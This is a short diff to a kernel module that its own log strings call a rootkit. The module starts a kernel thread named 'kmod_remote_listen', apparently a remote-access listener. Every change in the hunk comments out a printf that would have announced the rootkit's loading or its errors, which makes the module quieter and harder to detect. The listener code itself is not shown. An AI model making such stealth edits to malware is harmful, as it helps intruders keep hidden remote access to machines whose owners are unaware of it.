@@ -131,12 +131,12 @@ static int load(module_t module, int cmd, void *arg) {
             struct proc *p = NULL;
             error = kproc_create(remote_listener_thread, NULL, &p, 0, 0, "kmod_remote_listen");
             if (error == 0) {
-                printf("rootkit: module loaded & remote listener active\n");
+                // printf("rootkit: module loaded & remote listener active\n");
             } else {
-                printf("rootkit: device created, failed to start listener (%d)\n", error);
+                // printf("rootkit: device created, failed to start listener (%d)\n", error);
             }
         } else {
-            printf("rootkit: failed to create device (%d)\n", error);
+            // printf("rootkit: failed to create device (%d)\n", error);
         }
 
         break;
